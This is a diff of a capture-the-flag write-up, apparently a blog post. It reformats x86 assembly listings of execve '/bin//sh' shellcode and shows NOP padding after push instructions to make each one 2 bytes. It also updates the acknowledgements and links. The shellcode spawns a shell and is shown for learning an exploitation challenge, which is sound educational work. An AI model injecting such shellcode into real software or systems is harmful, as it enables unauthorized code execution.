@@ -160,16 +160,16 @@ The problem with the shellcode was that it used `5` bytes to pass `/bin//sh` to 
 
 
 ```asm 
-0:  31 c0                   xor    eax,eax
-2:  50                      push   eax
-3:  68 2f 2f 73 68          push   0x68732f2f
-8:  68 2f 62 69 6e          push   0x6e69622f
-d:  89 e3                   mov    ebx,esp
-f:  50                      push   eax
-10: 53                      push   ebx
-11: 89 e1                   mov    ecx,esp
-13: b0 0b                   mov    al,0xb
-15: cd 80                   int    0x80
+31 c0             xor  eax,eax
+50                push eax
+68 2f 2f 73 68    push 0x68732f2f
+68 2f 62 69 6e    push 0x6e69622f
+89 e3             mov  ebx,esp
+50                push eax
+53                push ebx
+89 e1             mov  ecx,esp
+b0 0b             mov  al,0xb
+cd 80             int  0x80
 ```
 
 
@@ -189,15 +189,15 @@ I found `5` instructions.
 
 
 ```asm
-2:  50  push   eax
-f:  50  push   eax
-10: 53  push   ebx
+50  push eax
+50  push eax
+53  push ebx
 ```
 
 
 ```asm
-3:  68 2f 2f 73 68          push   0x68732f2f
-8:  68 2f 62 69 6e          push   0x6e69622f
+68 2f 2f 73 68  # push 0x68732f2f
+68 2f 62 69 6e  # push 0x6e69622f
 ```
 
 
@@ -208,12 +208,12 @@ Passing `NOP`s after each `push` instruction will certify that they are `2` byte
 
 
 ```asm
-2:  50  push   eax
-0:  90  nop
-f:  50  push   eax
-0:  90  nop
-10: 53  push   ebx
-0:  90  nop
+50  push eax
+90  nop
+50  push eax
+90  nop
+53  push ebx
+90  nop
 ```
 
 
@@ -477,9 +477,11 @@ int main(int argc, char *argv[]) {
 ```
 
 
-Thanks to Professor Martin Carlisle and bernie6401 for their writeup. 
+Thanks to professor Martin Carlisle and bernie6401 for their writeup. 
 
 
-Probably wouldn't have solved it without their help. 
-
+I probably wouldn't have solved it without their help. 
+<br>
 {{< youtube _yW5QTVFGl8 >}}
+<br>
+https://hackmd.io/@SBK6401/HJ0Yn79ih
